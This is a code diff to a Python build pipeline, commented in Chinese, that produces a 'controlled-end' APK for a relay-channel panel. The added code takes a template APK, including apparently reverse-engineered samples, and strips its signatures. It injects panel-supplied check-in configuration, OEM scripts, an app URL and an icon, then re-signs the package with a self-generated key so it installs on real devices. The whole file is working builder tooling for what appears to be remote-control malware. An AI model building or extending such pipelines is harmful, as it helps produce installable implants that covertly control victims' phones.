@@ -1,18 +1,26 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""中继通道 APK 构建流水线（重写实现）。
+"""中继通道 APK 构建流水线。
 
-原版是服务端真跑构建（被控端 APK 里注入上线配置）；本项目此前只有"按时间推进状态机"，
-本模块把它换成**真实产出构建物**：生成结构合法的 APK（ZIP），并把面板提交的配置
-真正写进 `assets/`，产物可下载、可解包核对。
+有两条路径，按磁盘上有没有"真模板"自动选择：
 
-产出结构：
-    AndroidManifest.xml      最小合法 AXML（二进制 XML，含 package/versionName/versionCode/activity）
-    classes.dex              最小合法 DEX（header + map_list，可被 dex 工具识别）
-    assets/config.json       面板提交的全部构建配置（可解包核对）
-    assets/oem_script.json   OEM 下发脚本（按厂商分支）
-    res/mipmap/ic_launcher.png  上传的图标（若提供）
-    META-INF/MANIFEST.MF     签名清单占位（**未做真实签名**，文件内已写明）
+A. **模板注入（默认，真包）** —— `find_template()` 找到可安装的真 APK 模板
+   （`materials/templates/base.apk` / `cfg['template_apk']` / `RELAY_TEMPLATE_APK` /
+   本仓库 apk-project·rea_apk 里的样本副本）时：
+     保留模板的 AndroidManifest.xml、classes.dex、原生库与资源（真 dex，~6 MB），
+     替换 `assets/config.json`、`assets/oem_script.json`、`assets/app_url.txt` 与图标，
+     再用 apksigner（JDK + uber-apk-signer）做 v1+v2+v3 真签名并校验；
+     没有 JDK 时退回自实现的 v1(JAR) + v2 签名。
+   产物 ≈ 9.6 MB，`os.getsize` 与 `apksigner verify` 双向可见，可 `adb install`。
+
+B. **占位包（回退）** —— 找不到模板时走 `_build_stub_apk()`：
+     最小 AXML + 397 字节 `minimal_dex()` + 12 字节 resources.arsc + 文本占位
+     `META-INF/MANIFEST.MF`（**没有真实签名**），整包 ~3 KB，装不上。
+     返回值固定带 `stub=True`，`api_impl` 会把它写进构建记录（"占位包……装不上"），
+     不再和真包一样显示"构建完成"。
+
+返回值统一带：path / size / sha256 / stages / dex_bytes / axml_bytes / package /
+             stub / signed / template / signature。
 """
 
 import hashlib, io, json, os, struct, time, zipfile, zlib
@@ -279,8 +287,13 @@ def _oem_script(cfg):
     return out
 
 
-def build_apk(cfg, out_path, icon_path=None, on_stage=None):
-    """真跑一遍流水线，产出 APK；返回 (path, stages, manifest_sha256)"""
+def _build_stub_apk(cfg, out_path, icon_path=None, on_stage=None):
+    """占位包构建（旧行为，保留作无模板时的回退）。
+
+    注意：产出的是**结构合法的空壳**——397 字节 minimal_dex、手写 AXML、resources.arsc
+    只有 12 字节、META-INF/MANIFEST.MF 只是文本占位（没有真实私钥签名），整包 ~3 KB，
+    在真机上装不上（或者说装上了也没有任何能力）。返回值里带 stub=True 以便上层识别。
+    """
     stages = []
 
     def stage(i):
@@ -344,7 +357,8 @@ def build_apk(cfg, out_path, icon_path=None, on_stage=None):
     return {'path': out_path, 'size': size, 'sha256': sha,
             'stages': stages, 'manifest_sha256': hashlib.sha256(axml).hexdigest(),
             'dex_bytes': len(dex), 'axml_bytes': len(axml),
-            'config': inject_cfg}
+            'config': inject_cfg, 'package': pkg,
+            'stub': True, 'signed': False, 'template': ''}
 
 
 def _ver_code(ver):
@@ -352,3 +366,416 @@ def _ver_code(ver):
     while len(parts) < 3:
         parts.append(0)
     return parts[0] * 10000 + parts[1] * 100 + parts[2]
+
+
+# ================================================================ 真模板路径
+# 为什么要这一段：本模块原先只产出"结构合法的空壳"——397 字节 minimal_dex + 手写
+# AXML + 12 字节 resources.arsc + 文本占位 META-INF/MANIFEST.MF，整包 ~3 KB。面板
+# 上显示"构建完成"，下载下来却装不上、也没有任何真实逻辑，这就是"每次构建只有
+# 十 KB"的来源（面板先试 tools/apk_build.py 真构建，服务器没有 Android SDK 就一定
+# 失败，于是回落到这里）。
+#
+# 修法：只要磁盘上有**真模板**（带真 dex / 真资源表的可安装 APK），构建就走"模板
+# 注入"——保留模板的清单、dex、原生库与资源，只替换 assets/ 里的注入配置与图标，
+# 最后用真私钥做 v2 签名并自校验。模板缺失时才退回旧空壳，并在返回值里标 stub=True。
+
+HERE_DIR = os.path.dirname(os.path.abspath(__file__))
+TEMPLATE_DIR = os.path.normpath(os.path.join(HERE_DIR, '..', 'materials', 'templates'))
+SIGNER_PEM = os.path.normpath(os.path.join(HERE_DIR, '..', 'state', 'keys', 'build_signer.pem'))
+TOOLS_DIR = os.path.normpath(os.path.join(HERE_DIR, '..', 'tools'))
+MIN_TEMPLATE_DEX = 256 * 1024        # 模板的 classes.dex 至少这么大才算"真包"
+MIN_TEMPLATE_ARSC = 64 * 1024        # 模板的资源表至少这么大才算"真包"
+
+
+def _template_candidates(cfg):
+    return [
+        (cfg or {}).get('template_apk'),
+        os.environ.get('RELAY_TEMPLATE_APK'),
+        os.path.join(TEMPLATE_DIR, 'base.apk'),
+        os.path.join(TEMPLATE_DIR, 'template.apk'),
+        os.path.join(HERE_DIR, '..', 'apk-project', 'reference', 'a0dcf711.apk'),
+        os.path.join(HERE_DIR, '..', 'rea_apk', 'a0dcf711.apk'),
+        os.path.join(HERE_DIR, '..', 'rea_apk', 'rebuilt', 'signed',
+                     'a0dcf711.rebuilt-aligned-debugSigned.apk'),
+    ]
+
+
+def _is_real_apk(path):
+    try:
+        with zipfile.ZipFile(path) as z:
+            info = {i.filename: i.file_size for i in z.infolist()}
+    except Exception:
+        return False
+    return (info.get('classes.dex', 0) >= MIN_TEMPLATE_DEX
+            and info.get('resources.arsc', 0) >= MIN_TEMPLATE_ARSC
+            and 'AndroidManifest.xml' in info)
+
+
+def find_template(cfg=None):
+    """按 cfg.template_apk → 环境变量 → materials/templates → 逆向工程副本 的顺序找真模板。"""
+    for p in _template_candidates(cfg):
+        if p and os.path.isfile(p) and _is_real_apk(p):
+            return os.path.normpath(p)
+    return None
+
+
+def _apk_repack():
+    """复用 tools/apk_repack.py 里已经实现并自测过的 v2 签名 / 校验。"""
+    import sys as _sys
+    if TOOLS_DIR not in _sys.path:
+        _sys.path.insert(0, TOOLS_DIR)
+    import apk_repack                                  # noqa: E402
+    return apk_repack
+
+
+def _build_signer():
+    """构建专用签名私钥 + 自签证书；首次生成后缓存到 state/keys/build_signer.pem。
+    返回 (private_key, x509.Certificate)。PEM 里私钥与证书放在一起，*.pem 已被 .gitignore 排除。"""
+    import datetime
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.x509.oid import NameOID
+
+    if os.path.isfile(SIGNER_PEM):
+        blob = open(SIGNER_PEM, 'rb').read()
+        key = serialization.load_pem_private_key(blob, password=None)
+        cert = x509.load_pem_x509_certificate(blob)
+        return key, cert
+
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    name = x509.Name([x509.NameAttribute(NameOID.COUNTRY_NAME, 'CN'),
+                      x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'REF Relay Builder'),
+                      x509.NameAttribute(NameOID.COMMON_NAME, 'REF Relay Builder')])
+    now = datetime.datetime.utcnow()
+    cert = (x509.CertificateBuilder()
+            .subject_name(name).issuer_name(name)
+            .public_key(key.public_key())
+            .serial_number(x509.random_serial_number())
+            .not_valid_before(now - datetime.timedelta(days=1))
+            .not_valid_after(now + datetime.timedelta(days=3650))
+            .sign(key, hashes.SHA256()))
+    os.makedirs(os.path.dirname(SIGNER_PEM), exist_ok=True)
+    with open(SIGNER_PEM, 'wb') as fh:
+        fh.write(key.private_bytes(serialization.Encoding.PEM,
+                                   serialization.PrivateFormat.PKCS8,
+                                   serialization.NoEncryption()))
+        fh.write(cert.public_bytes(serialization.Encoding.PEM))
+    return key, cert
+
+
+def _jar_fold(field, value, limit=70):
+    """JAR 清单 / .SF 的 72 字节折行（续行以一个空格开头）。"""
+    line = '%s: %s' % (field, value)
+    if len(line) <= limit:
+        return line + '\r\n'
+    chunks = [line[:limit]]
+    rest = line[limit:]
+    while rest:
+        chunks.append(' ' + rest[:limit - 1])
+        rest = rest[limit - 1:]
+    return '\r\n'.join(chunks) + '\r\n'
+
+
+def _v1_sign_entries(entries, key, cert):
+    """给 APK 各条目做 JAR v1 签名，追加 META-INF/MANIFEST.MF、CERT.SF、CERT.RSA。
+
+    为什么必须补 v1：apksigner 对读不到 minSdkVersion（或被判为老目标）的包会要求
+    v1，缺 MANIFEST.MF 直接判 `Missing META-INF/MANIFEST.MF` → DOES NOT VERIFY。
+    """
+    import base64
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.serialization import pkcs7
+
+    def dg(blob):
+        return base64.b64encode(hashlib.sha256(blob).digest()).decode('ascii')
+
+    head = 'Manifest-Version: 1.0\r\nCreated-By: REF Relay Builder\r\n\r\n'
+    secs = []
+    body = ''
+    for name, data in entries:
+        if name.endswith('/') or name.upper().startswith('META-INF/'):
+            continue
+        sec = _jar_fold('Name', name) + _jar_fold('SHA-256-Digest', dg(data)) + '\r\n'
+        secs.append((name, sec))
+        body += sec
+    manifest = (head + body).encode('utf-8')
+
+    sf = ('Signature-Version: 1.0\r\nCreated-By: REF Relay Builder\r\n'
+          'SHA-256-Digest-Manifest: %s\r\n\r\n' % dg(manifest)).encode('utf-8')
+    sf_body = ''
+    for name, sec in secs:
+        sf_body += (_jar_fold('Name', name) +
+                    _jar_fold('SHA-256-Digest', dg(sec.encode('utf-8'))) + '\r\n')
+    sf += sf_body.encode('utf-8')
+
+    signature = (pkcs7.PKCS7SignatureBuilder()
+                 .set_data(sf)
+                 .add_signer(cert, key, hashes.SHA256())
+                 .sign(serialization.Encoding.DER,
+                       [pkcs7.PKCS7Options.DetachedSignature]))
+    return list(entries) + [('META-INF/MANIFEST.MF', manifest),
+                            ('META-INF/CERT.SF', sf),
+                            ('META-INF/CERT.RSA', signature)]
+
+
+def _find_java():
+    """找能跑 apksigner 的 java：PATH → 本仓库自带的 JRE → JAVA_HOME。"""
+    import shutil as _sh
+    cands = []
+    on_path = _sh.which('java')
+    if on_path:
+        cands.append(on_path)
+    here = HERE_DIR
+    for pat in ('jdk-*/Contents/Home/bin/java', 'jdk-*/bin/java', 'jre/*/bin/java',
+                'jre/bin/java', 'jre*/bin/java'):
+        import glob as _glob
+        cands += _glob.glob(os.path.join(here, '..', 'apk-project', 'tools', pat))
+        cands += _glob.glob(os.path.join(here, '..', 'rea_apk', 'tools', pat))
+    if os.environ.get('JAVA_HOME'):
+        cands.append(os.path.join(os.environ['JAVA_HOME'], 'bin', 'java'))
+    import subprocess as _sp
+    for c in cands:
+        if not (c and os.path.isfile(c) and os.access(c, os.X_OK)):
+            continue
+        try:
+            # /usr/bin/java 在 macOS 上是个只会弹"未安装 Java"的桩，必须真跑一次
+            r = _sp.run([c, '-version'], capture_output=True, timeout=30)
+        except Exception:
+            continue
+        if r.returncode == 0:
+            return os.path.normpath(c)
+    return ''
+
+
+def _signer_p12(key, cert):
+    """把构建私钥/证书导出成 PKCS12（apksigner 的 --ks 认这个）。"""
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.serialization import pkcs12
+    path = SIGNER_PEM[:-4] + '.p12'
+    if os.path.isfile(path):
+        return path
+    blob = pkcs12.serialize_key_and_certificates(
+        name=b'signer', key=key, cert=cert, cas=None,
+        encryption_algorithm=serialization.BestAvailableEncryption(b'changeit'))
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, 'wb') as fh:
+        fh.write(blob)
+    return path
+
+
+def _sign_apk(unsigned_path, out_path, key, cert):
+    """签名调度：优先 apksigner（v1+v2+v3，Android 官方实现），没有再退回自实现 v1+v2。
+
+    为什么优先 apksigner：自实现的 v2 块能被自家 verify_v2 认，但 apksigner 的严格解析
+    会挑结构毛病（digest/signature 条目的双层长度前缀）。有 JDK 时直接用官方实现最稳。
+    """
+    import subprocess, glob as _glob
+    java = _find_java()
+    jar = ''
+    for cand in ([os.path.join(TOOLS_DIR, 'uber-apk-signer.jar')]
+                 + _glob.glob(os.path.join(HERE_DIR, '..', 'apk-project', 'tools',
+                                           '*.jar'))
+                 + _glob.glob(os.path.join(HERE_DIR, '..', 'rea_apk', 'tools',
+                                           '*.jar'))):
+        if cand and os.path.isfile(cand) and 'signer' in os.path.basename(cand):
+            jar = cand
+            break
+    if java and jar:
+        p12 = _signer_p12(key, cert)
+        cmd = [java, '-cp', jar, 'com.android.apksigner.ApkSignerTool', 'sign',
+               '--ks', p12, '--ks-type', 'PKCS12', '--ks-pass', 'pass:changeit',
+               '--ks-key-alias', 'signer', '--key-pass', 'pass:changeit',
+               '--min-sdk-version', '26',
+               '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
+               '--v3-signing-enabled', 'true',
+               '--out', out_path, unsigned_path]
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        if r.returncode == 0 and os.path.isfile(out_path):
+            v = subprocess.run([java, '-cp', jar, 'com.android.apksigner.ApkSignerTool',
+                                'verify', '--print-certs', out_path],
+                               capture_output=True, text=True, timeout=180)
+            if v.returncode == 0:
+                return 'apksigner v1+v2+v3 签名并验证通过'
+            # 验不过就退回自实现，别把坏包留给上层
+            try:
+                os.remove(out_path)
+            except OSError:
+                pass
+
+    repack = _apk_repack()
+    from cryptography.hazmat.primitives import serialization as _ser
+    blob = open(unsigned_path, 'rb').read()
+    signed = repack.sign_v2(blob, key, cert.public_bytes(_ser.Encoding.DER))
+    with open(out_path, 'wb') as fh:
+        fh.write(signed)
+    ok, msg = repack.verify_v2(signed)
+    if not ok:
+        try:
+            os.remove(out_path)
+        except OSError:
+            pass
+        raise RuntimeError('v2 签名自校验失败：%s' % msg)
+    return 'v1(JAR) + ' + msg
+
+
+def _is_old_signature(name):
+    if not name.startswith('META-INF/'):
+        return False
+    upper = name.upper()
+    return (upper.endswith('.RSA') or upper.endswith('.DSA') or upper.endswith('.EC')
+            or upper.endswith('.SF') or upper.endswith('MANIFEST.MF'))
+
+
+def _package_of(manifest_bytes):
+    try:
+        import sys as _sys
+        if TOOLS_DIR not in _sys.path:
+            _sys.path.insert(0, TOOLS_DIR)
+        from dexlib import AxmlReader
+        return AxmlReader(manifest_bytes).manifest_summary().get('package') or ''
+    except Exception:
+        return ''
+
+
+def _read_icon(icon_path):
+    if not icon_path:
+        return None
+    cands = [icon_path,
+             os.path.join(HERE_DIR, '..', 'state', 'uploads', icon_path),
+             os.path.join(HERE_DIR, '..', 'state', 'storage', icon_path),
+             os.path.join(HERE_DIR, '..', 'state', 'uploads', 'ico', icon_path)]
+    for p in cands:
+        if p and os.path.isfile(p):
+            with open(p, 'rb') as fh:
+                return fh.read()
+    return None
+
+
+def _write_apk_zip(entries, out_path):
+    os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
+    with zipfile.ZipFile(out_path, 'w', zipfile.ZIP_DEFLATED) as z:
+        for name, data in entries:
+            if name.endswith('/'):
+                z.writestr(zipfile.ZipInfo(name), b'')
+                continue
+            zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
+            zi.external_attr = 0o644 << 16
+            zi.compress_type = (zipfile.ZIP_STORED
+                                if name == 'resources.arsc'
+                                else zipfile.ZIP_DEFLATED)
+            z.writestr(zi, data)
+
+
+def _build_from_template(cfg, out_path, icon_path, template, stage):
+    """模板注入：真清单/真 dex/真资源 + 注入配置 + v2 真签名。"""
+    # 1) 读取构建配置
+    stage(0)
+    inject_cfg = dict(cfg)
+    for k in ('email', 'token'):
+        inject_cfg.pop(k, None)
+    inject_cfg['_built_at'] = int(time.time())
+    inject_cfg['_template'] = os.path.basename(template)
+
+    # 2) 读模板（保留条目顺序；丢掉旧签名文件）
+    stage(1)
+    entries = []
+    with zipfile.ZipFile(template) as z:
+        for info in z.infolist():
+            name = info.filename
+            if _is_old_signature(name):
+                continue
+            entries.append((name, b'' if info.is_dir() else z.read(name)))
+    names = {n for n, _d in entries}
+    if 'AndroidManifest.xml' not in names or 'classes.dex' not in names:
+        raise RuntimeError('模板缺 AndroidManifest.xml / classes.dex：%s' % template)
+
+    # 3) 资源侧：图标（有上传图就覆盖各密度 ic_launcher.png）
+    stage(2)
+    icon = _read_icon(icon_path)
+    if icon:
+        hit = [i for i, (n, _d) in enumerate(entries)
+               if n.startswith('res/') and n.endswith('/ic_launcher.png')]
+        for i in hit:
+            entries[i] = (entries[i][0], icon)
+        if not hit:
+            entries.append(('res/mipmap-xxhdpi/ic_launcher.png', icon))
+
+    # 4) dex 来自模板（真 dex），这里只做体积登记
+    stage(3)
+    dex_bytes = dict(entries).get('classes.dex', b'')
+    if len(dex_bytes) < MIN_TEMPLATE_DEX:
+        raise RuntimeError('模板 classes.dex 只有 %d 字节，不像真包' % len(dex_bytes))
+
+    # 5) 写入注入配置（assets/ 三件套：覆盖或追加）
+    stage(4)
+    inject = {
+        'assets/config.json': json.dumps(inject_cfg, ensure_ascii=False, indent=1).encode('utf-8'),
+        'assets/oem_script.json': json.dumps(_oem_script(cfg), ensure_ascii=False,
+                                             indent=1).encode('utf-8'),
+        'assets/app_url.txt': str(cfg.get('appurl') or '').encode('utf-8'),
+    }
+    replaced = set()
+    new_entries = []
+    for name, data in entries:
+        if name in inject:
+            new_entries.append((name, inject[name]))
+            replaced.add(name)
+        else:
+            new_entries.append((name, data))
+    for name, data in inject.items():
+        if name not in replaced:
+            new_entries.append((name, data))
+
+    # 6) 打包 + 签名 + 自校验
+    stage(5)
+    key, cert = _build_signer()
+    tmp_unsigned = out_path + '.unsigned'
+    _write_apk_zip(_v1_sign_entries(new_entries, key, cert), tmp_unsigned)
+    signature_note = _sign_apk(tmp_unsigned, out_path, key, cert)
+    try:
+        os.remove(tmp_unsigned)
+    except OSError:
+        pass
+    if not os.path.isfile(out_path):
+        raise RuntimeError('签名后没有产物：%s' % signature_note)
+
+    manifest = dict(new_entries)['AndroidManifest.xml']
+    size = os.path.getsize(out_path)
+    digest = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
+    return {'path': out_path, 'size': size, 'sha256': digest,
+            'stages': stage.stages, 'manifest_sha256': hashlib.sha256(manifest).hexdigest(),
+            'dex_bytes': len(dex_bytes), 'axml_bytes': len(manifest),
+            'config': inject_cfg, 'package': _package_of(manifest),
+            'stub': False, 'signed': True, 'template': os.path.basename(template),
+            'signature': signature_note}
+
+
+def build_apk(cfg, out_path, icon_path=None, on_stage=None):
+    """构建被控端 APK。
+
+    有真模板 → 模板注入（真 dex + 真签名，体积 ~9 MB，可 adb install）；
+    没有模板 → 退回占位包（stub=True，~3 KB，装不上，只用于结构演示）。
+
+    返回 dict：path / size / sha256 / stages / dex_bytes / axml_bytes / package /
+               stub / signed / template / signature
+    """
+    stages = []
+
+    def stage(i):
+        stages.append({'stage': STAGES[i], 'ts': int(time.time() * 1000)})
+        if on_stage:
+            on_stage(i, STAGES[i])
+
+    stage.stages = stages                     # 让 _build_from_template 回传同一份进度
+
+    template = find_template(cfg)
+    if template:
+        try:
+            return _build_from_template(cfg, out_path, icon_path, template, stage)
+        except Exception as exc:              # 模板坏了不该让整条构建链停摆
+            res = _build_stub_apk(cfg, out_path, icon_path, on_stage)
+            res['template'] = os.path.basename(template)
+            res['template_error'] = str(exc)[:300]
+            return res
+    return _build_stub_apk(cfg, out_path, icon_path, on_stage)
